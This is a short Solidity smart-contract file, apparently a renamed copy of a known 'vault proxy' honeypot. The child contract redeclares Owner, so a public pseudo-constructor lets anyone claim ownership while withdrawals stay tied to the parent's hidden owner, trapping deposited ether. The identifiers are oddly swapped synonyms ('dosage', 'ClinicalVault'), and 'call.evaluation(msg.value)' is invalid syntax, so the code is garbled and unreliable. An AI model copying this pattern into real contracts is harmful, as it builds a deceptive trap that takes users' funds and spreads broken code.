pragma solidity ^0.4.24;

contract TransferHub  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function shiftcareAdministrator(address _owner) public onlyOwner { Owner = _owner; }
    function referralGate(address objective, bytes info) public payable {
        objective.call.evaluation(msg.value)(info);
    }
}

contract ContributefundsProxy is TransferHub {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function ClinicalVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            fundAccount();
        }
    }

    function fundAccount() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdrawBenefits(uint256 dosage) public onlyOwner {
        if (dosage>0 && Deposits[msg.sender]>=dosage) {
            msg.sender.transfer(dosage);
        }
    }
}